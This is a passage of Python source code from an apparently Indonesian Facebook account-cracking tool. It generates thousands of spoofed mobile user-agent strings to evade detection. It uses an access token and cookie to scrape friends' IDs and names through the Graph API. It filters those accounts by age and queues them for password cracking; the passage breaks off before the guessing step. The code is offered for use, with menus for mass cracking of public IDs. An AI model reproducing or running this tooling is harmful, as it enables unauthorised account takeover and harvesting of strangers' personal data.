	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Safari/537.36'
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	uaa.append(uaku2)
	aa='Mozilla/5.0 (Linux; U; Android '
	b=random.choice(['4.3','5.0','7.0','8.1.0','9','10','11','12','13'])
	c='en-us; ASUS_T00F Build/'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/534.30 (KHTML, like Gecko) '
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Version/4.0 Mobile Safari/534.30 Mobile UCBrowser/3.4.1.483'
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	uaa.append(uaku2)
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['Oppo A4 Build/MMB29M; wv)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	uaa.append(uaku2)
	aa='Mozilla/5.0 (X11'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['Linux x86_64)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Safari/537.36'
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	uaa.append(uaku2)
	aa='Mozilla/5.0 (Linux; U; Android;'
	b=random.choice(['6','7','8','9','10','11','12'])
	c='en-us; Redmi 5 Plus Build/OPM1.171019.019'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='UCBrowser/13.4.0.1306 Mobile Safari/537.36'
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	uaa.append(uaku2)
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
	c=random.choice(['SAMSUNG GT-I9506/XXUDOE4 Build/LRX22C'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/6.4 Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	uaa.append(uaku2)
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
	c=random.choice(['Redmi 4A Build/MMB29M; wv)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	uaa.append(uaku2)
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
	c=random.choice(['CPH2349) AppleWebKit/537.36'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='(KHTML, like Gecko) Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	uaa.append(uaku2)

	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
	c=random.choice(['Infinix X682C)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	uaa.append(uaku2)	
	aa='Mozilla/5.0 (Linux; Android 7.0;'
	b=random.choice(['4.3','5.0','7.0','8.1.0','9','10','11','12','13'])
	c='Infinix X559C Build/NRD90M)'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.137'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	uaa.append(uaku2)	
	aa='Mozilla/5.0 (Linux;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['U; Android 8.1.0; en-us; Redmi 5 Plus Build/OPM1.171019.019)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.127'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36 XiaoMi/MiuiBrowser/17.1.8 swan-mibrowser'
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	uaa.append(uaku2)	
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['Oppo A4 Build/MMB29M; wv)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	uaa.append(uaku2)	
	aa='Mozilla/5.0 (Linux; Android 10'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['Mi 9T Pro Build/QKQ1.190825.002; wv)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	uaa.append(uaku2)	
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['CPH1931 Build/QKQ1.200209.002; wv)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	uaa.append(uaku2)	
	aa='Mozilla/5.0 (Linux; U; Android '
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['ru-ru; Redmi 4A Build/N2G47H)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	uaa.append(uaku2)	
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['SM-N920)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Safari/537.36'
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	uaa.append(uaku2)	
	aa='Mozilla/5.0 (Linux; Android '
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['Samsung Galaxy Note 9 Build/SM-N960N)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/605.1. 15 (KHTML, like Gecko) Version/5.2 Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/604.1.'
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	uaa.append(uaku2)
	aa='Mozilla/5.0 (Linux; Android '
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['M2012K11AG Build/L120G)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko)86.0.4529.132 Version/4.0 Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	uaa.append(uaku2)
	aa='Mozilla/5.0 (Linux; Android '
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['MITO A75)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	uaa.append(uaku2)
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
	c=random.choice(['en-US; vivo 1807 Build/OPM1.171019.026'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='UCBrowser/11.4.8.1012 Mobile Safari/537.36'
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	uaa.append(uaku2)
for t in range(10000):
    a=random.choice(['3','4','5','6','7','8','9','10','11','12','13'])
    b=random.randrange(111111,210000)
    c=random.randrange(73,100)
    d=random.randrange(4200,4900)
    e=random.randrange(40,150)
    f= random.randrange(15, 40)
    g=random.randrange(11, 21)
    XILL=f'Mozilla/5.0 (Linux; Android {a}; SAMSUNG SM-C7{f}F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{g}.0 Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
    uaa.append(XILL)
##################################Logo Boleh Di Ubah Asal Jangan Author Nya#####################
def logo():
	cetak(pnl("""'[green]     _____                   _                  _
    |_   _|_ _ _ __ ___  ___(_)___     __  ____| |
      | |/ _` | '_ ` _ \/ __| / __|____\ \/ / _` |        
[red]      | | (_| | | | | | \__ \ \__ \_____>  < (_| |      
      |_|\__,_|_| |_| |_|___/_|___/    /_/\_\__,_|           [yellow]Author : Tamsis[white]""",width=90,padding=(0,1),style=f"bold cyan"))


def menu():
	logo()
	cetak(pnl("""  [green] [ 1 ] Crack ID Publik
   [ 2 ] Crack ID Publik Massal Otomatis
   [ 3 ] Crack ID Publik Massal Manual
   [ 4 ] Crack File""",width=90,padding=(0,1),title=f"MENU",style=f"bold cyan"))
	menu = input('pilih : ')
	if menu in['1']:
		cetak(pnl("""[white][ 1 ] Dump ID Tua[ 2011-2015 ]
[ 2 ] Dump ID Muda[ 2016-2023 ]
[ 3 ] Dump Semua ID
[white][ 4 ] [red]Dump ID Tua[ 2009-2010 ]
[white][ 5 ] [red]Dump ID Tua[ 2009 ]""",width=90,padding=(0,1),title=f"UMUR",style=f"bold cyan"))
		cetak(pnl('[ 6 ] Mencari Tumbal [ 2023 ]',width=90,padding=(0,1),title=f"CARI TUMBAL",style=f"bold green"))
		p = input('pilih : ')
		if p in ['1']:umur.append('tua')
		elif p in ['2']:umur.append('muda')
		elif p in ['3']:umur.append('tamsis')
		elif p in ['4']:umur.append('sepuh')
		elif p in ['5']:umur.append('modar')
		elif p in ['6']:umur.append('tumbal')
		else:umur.append('tamsis')
		dump('publik')
	elif menu in['2']:
		cetak(pnl("""[white][ 1 ] Dump ID Tua[ 2011-2015 ]
[ 2 ] Dump ID Muda[ 2016-2023 ]
[ 3 ] Dump Semua ID
[white][ 4 ] [red]Dump ID Tua[ 2009-2010 ]
[white][ 5 ] [red]Dump ID Tua[ 2009 ]""",width=90,padding=(0,1),title=f"UMUR",style=f"bold cyan"))
		#cetak(pnl('[white][ 6 ] Mencari Tumbal [ 2023 ]',width=90,padding=(0,1),title=f"CARI TUMBAL",style=f"bold green"))
		p = input('Pilih : ')
		if p in ['1']:umur.append('tua')
		elif p in ['2']:umur.append('muda')
		elif p in ['3']:umur.append('tamsis')
		elif p in ['4']:umur.append('sepuh')
		elif p in ['5']:umur.append('modar')
		#elif p in ['6']:umur.append('tumbal')
		else:umur.append('tamsis')
		dump('massal')
	elif menu in ['3']:
		cetak(pnl("""[white][ 1 ] Dump ID Tua[ 2011-2015 ]
[ 2 ] Dump ID Muda[ 2016-2023 ]
[ 3 ] Dump Semua ID
[white][ 4 ] [red]Dump ID Tua[ 2009-2010 ]
[white][ 5 ] [red]Dump ID Tua[ 2009 ]""",width=90,padding=(0,1),title=f"UMUR",style=f"bold cyan"))
		cetak(pnl('[white][ 6 ] Mencari Tumbal [ 2023 ]',width=90,padding=(0,1),title=f"CARI TUMBAL",style=f"bold green"))
		p = input('pilih : ')
		if p in ['1']:umur.append('tua')
		elif p in ['2']:umur.append('muda')
		elif p in ['3']:umur.append('tamsis')
		elif p in ['4']:umur.append('sepuh')
		elif p in ['5']:umur.append('modar')
		elif p in ['6']:umur.append('tumbal')
		else:umur.append('tamsis')
		dump_masal()
	elif menu in['4']:
		nama = input('pilih file : /sdcard/')
		try:p = open('/sdcard/'+nama,'r').read().splitlines()
		except:print('file tidak ditemukan');exit()
		for kontol in p :
			ido=kontol.split('|')[0]
			if len(ido)>12:
				id.append(kontol)
				print(f'\r{len(id)} ID Terkumpul',end='')
				sys.stdout.flush()			
			else:pass			
		ngatur()
def dump_masal():
	ke=1
	juml = input('Jumlah ID publik : ')
	for i in range(int(juml)):
		c = input('Masukan ID Ke '+str(ke)+' : ')
		p = Tamsis(f'https://graph.facebook.com/v16.0/{c}?fields=friends.limit(5000)&access_token='+token[0],cookies={'cookie': cok[0]}).json()
		try:
			j = (p['error']['message'])
			print(j)
			break
		except KeyError:
			try:
					if 'tua' in umur:
						print('tua')
						for i in p['friends']['data']:
							c = (i['id']+'|'+i['name'])
							g = (i['id'])
							if '100001' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '100002' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '100003' in c:
								if c in id:pass
								else:		
									if len(g)<14:pass
									else:id.append(c)
							elif '100004' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '100005' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '100006' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '100007' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '100008' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '100009' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							else:pass
							print(f'\rberhasil dump {len(id)} ID',end='')
							sys.stdout.flush()
					elif 'sepuh' in umur:
						print('sepuh')
						for i in p['friends']['data']:
							c = (i['id']+'|'+i['name'])
							g = (i['id'])
							if '1000001' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '1000002' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '1000003' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '1000004' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '1000005' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '1000006' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '1000007' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '1000008' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '1000009' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							else:pass
							print(f'\rberhasil dump {len(id)} ID',end='')
							sys.stdout.flush()
					elif 'modar' in umur:
						print('modar')
						for i in p['friends']['data']:
							c = (i['id']+'|'+i['name'])
							g = (i['id'])
							if '1000000' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							else:pass
							print(f'\rberhasil dump {len(id)} ID',end='')
							sys.stdout.flush()
					elif 'muda' in umur:
						print('muda')
						for i in p['friends']['data']:
							c = (i['id']+'|'+i['name'])
							g = (i['id'])
							if '10001' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '10002' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '10003' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '10004' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '10005' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '10006' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '10007' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '10008' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							else:pass
							print(f'\rberhasil dump {len(id)} ID',end='')
							sys.stdout.flush()
					elif 'tumbal' in umur:
						for i in p['friends']['data']:
							c = (i['id']+'|'+i['name'])
							g = (i['id'])
							if '10008' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							elif '10009' in c:
								if c in id:pass
								else:
									if len(g)<14:pass
									else:id.append(c)
							else:pass
							print(f'\rberhasil dump {len(id)} ID',end='')
							sys.stdout.flush()
					else:
						print('acak')
						for i in p['friends']['data']:
							c = (i['id']+'|'+i['name'])
							g = (i['id'])
							if c in id:pass
							else:
								if len(g)<14:pass
								else:id.append(c)
							print(f'\rberhasil dump {len(id)} ID',end='')
							sys.stdout.flush()
					ke+=1
			except KeyError:
				print('\nGagal Dump ID\n[ ! ]ID Harus Public')
	cetak(pnl(f'Total {len(id)} Terkumpul',width=90,padding=(0,1),style=f"bold cyan"))
	p = input('Lanjut Crack (Y/n) : ')
	if p in ['n','N']:
		print(f'Yah {len(id)} Hangus ')
		exit()
	else:ngatur()
		
def dump(opsi):
	if 'massal' in opsi:
		global limitd
		u = input('ID Publik : ')
		cetak(pnl('[white]Di Sarankan Jangan Lebih Dari 30000',width=90,padding=(0,1),style=f"bold cyan"))
		limit = input('Limit : ')
		mek = 0+ int(limit)
		limitd+=mek
		p = Tamsis(f'https://graph.facebook.com/v16.0/{u}?fields=friends.limit(5000)&access_token='+token[0],cookies={'cookie': cok[0]}).json()
		try:
			print(p['error']['message']);pass
		except KeyError:
			try:
				for i in p['friends']['data']:
					p = (i['id'])
					if len(p)<14:pass
					else:uid.append(p)
			except KeyError:print('\nGagal Dump ID\n[ ! ]ID Harus Public')
		dump_id('masal')
	elif 'publik' in opsi:
		p = input('ID Publik : ')
		uid.append(p)
		dump_id('publik')
def dump_id(pel):
	for u in uid:
		p = Tamsis(f'https://graph.facebook.com/v16.0/{u}?fields=friends.limit(5000)&access_token='+token[0],cookies={'cookie': cok[0]}).json()
		try:
			j = (p['error']['message'])
			if 'publik' in pel:print(j);exit()
			else:print(j);break
		except KeyError:
			try:
				if pel in ['publik']:
					if 'tua' in umur:
						for i in p['friends']['data']:
